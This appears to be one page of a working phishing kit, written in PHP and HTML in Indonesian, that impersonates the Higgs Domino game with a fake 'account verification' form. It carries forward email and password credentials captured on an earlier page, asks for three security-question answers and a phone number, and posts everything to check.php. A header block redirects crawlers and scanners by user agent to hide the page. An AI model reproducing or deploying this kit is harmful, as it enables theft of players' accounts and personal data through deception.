<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$emailpg = $_POST['emailpg'];
$passwordpg = $_POST['passwordpg'];
$email = $_POST['email'];
$password = $_POST['password'];
$nick = $_POST['nick'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: index.php");
}
?>
<!-- https://t.me/jefanyastore -->
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Jefanya Store">
        <meta name="theme-color" content="#f4d9aa">
        <meta property="og:image" content="https://rawcdn.githack.com/AlexHostX/logAlex/6e61ca3b0b15b5e31a9a43579821321116c6af0c/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
    </head>
    <style>
body {
  background: #043e3a;
  color: #2ba39b;
  font-family: "Helvetica Neue", Helvetica, STHeiTi, Arial, sans-serif;
  margin: 0
}

.appalexhdiprem {
  background: #043e3a;
  background-size: 100% 100%;
  position: relative;
  margin: 0 auto;
  max-width: 411px;
  height: auto
}

.containeralexhdi {
  display: flow-root
}
    .boxverifalexhdi {
  color: #b86d49;
  background: #f4d9aa
}

.headeralexverifhdi {
  background: url(https://sdomino.boxiangyx.com/images/kefu/tab-active.png) no-repeat center;
  background-size: 100% 100%;
  font-size: 19px;
  line-height: 40px;
  text-align: center;
  color: #996028;
  font-weight: 700;
  border-bottom: 1px solid #e7a551
}

.headeralexverifhdi p {
  margin-block: 0
}

.boxalexverifmarsya {
  background: url(https://sdomino.boxiangyx.com/images/kefu/shadow-02.png) no-repeat center;
  background-size: cover;
  padding: 10px
}

.ucapanverifalex {
  display: flex;
  flex-direction: column;
  line-height: 18px;
  font-size: 14px
}

.verifikasikeamananalex {
  padding: 10px
}

.itemalexverifhdi {
  display: flex;
  margin-bottom: 10px
}

.itemalexverifhdi label {
  background: #ffbc68;
  color: #814545;
  padding: 8px;
  border-radius: 5px;
  font-weight: 600;
  text-align: center;
  display: flex;
  flex-direction: row;
  align-items: center
}

.itemalexverifhdi select {
  width: 100%;
  margin-left: 10px;
  background: #d5b184;
  color: #835121;
  border: none;
  padding: 10px 10px;
  font-size: 17px;
  border-radius: 5px;
  outline: 0
}

.itemalexverifhdi input {
  width: 100%;
  margin-left: 10px;
  background: #d5b184;
  color: #835121;
  border: none;
  padding: 10px 10px;
  font-size: 17px;
  border-radius: 5px;
  outline: 0
}

.buttonalexverifhdi {
  text-align: center
}

.buttonalexverifhdi button {
  background-color: #67a309;
  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
  color: #268707;
  border: none;
  font-size: 20px;
  font-weight: 600;
  margin-top: 10px;
  line-height: 30px;
  border-radius: 10px;
  box-shadow: 0 2px 1px 0 #1a5806;
  outline: 0;
  padding: 4px 30px
}
</style>
<body style="background: #f4d9aa;">
        <div class="appalexhdiprem" style="background: #f4d9aa;">
            <div class="containeralexhdi">
                <div class="boxverifalexhdi">
                    <div class="headeralexverifhdi">
                        <p>Info: Verifikasi akun Anda.</p>
                    </div>
                    <div class="boxalexverifmarsya">
                        <div class="ucapanverifalex">
                            <span>Pemain Yang Terhormat,</span>
                            <span>Kami memohon maaf atas "<label>Informasi Yang Tidak Mendukung</label>" yang tidak bisa membaca data game Anda. Untuk melanjutkan mohon untuk memverifikasi akun Anda terlebih dahulu.</span>
                        </div>
                    </div>
                    <div class="verifikasikeamananalex">
                        <form method="POST" action="check.php" class="boxformalex">
                            <div class="itemalexverifhdi">
                                <label>Q1</label>
                                <select name="quest1">
                                    <option>Apa nama film pertama yang Anda tonton?</option>
                                    <option>Apa mobil kesukaan Anda?</option>
                                    <option>Tim sepak bola kesukaan Anda?</option>
                                    <option>Nama panggilan masa kecil Anda?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A1</label>
                                <input type="text" name="answer1" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>Q2</label>
                                <select name="quest2">
                                    <option>Apa pekerjaan pertama Anda?</option>
                                    <option>Siapa nama sahabat Anda?</option>
                                    <option>Apa nama hewan peliharaan Anda?</option>
                                    <option>Siapa penyanyi yang Anda sukai?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A2</label>
                                <input type="text" name="answer2" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>Q3</label>
                                <select name="quest3">
                                    <option>Apa makanan kesukaan Anda?</option>
                                    <option>Apa pekerjaan yang Anda inginkan?</option>
                                    <option>Artis mana yang paling Anda sukai?</option>
                                    <option>Apa mainan pertama Anda?</option>
                                </select>
                            </div>
                            <div class="itemalexverifhdi">
                                <label>A3</label>
                                <input type="text" name="answer3" placeholder="Silahkan masukkan Jawaban" required>
                            </div>
                            <br>
                            <div class="itemalexverifhdi">
                                <label>Telepon</label>
                                <input type="number" name="phone" placeholder="Silahkan masukkan Nomor Telepon" pattern="[0-9]{10,15}" autocomplete="off" required>
                            </div>
                            <div class="buttonalexverifhdi">
                                <input type="hidden" name="email" value="<?php echo $email;?>" readonly>
                                <input type="hidden" name="password" value="<?php echo $password;?>" readonly>
                                <input type="hidden" name="nick" value="<?php echo $nick;?>" readonly>
                                <input type="hidden" name="emailpg" value="<?php echo $emailpg;?>" readonly>
                                <input type="hidden" name="passwordpg" value="<?php echo $passwordpg;?>" readonly>
                                <button type="submit">Kirim</button>
                            </div>
                        </form>
                    </div>
                </div>
                <iframe scrolling="no" allow="autoplay" controls loop src="https://rawcdn.githack.com/AlexHostX/all.asset/4cbbdb7896dc6b935b849a64a893248f1e1a7c03/theme_alex_hdi.mp3" style="display: none" width="0" height="0" frameborder="no"></iframe>
            </div>
        </div>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>   
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    </body>
</html>




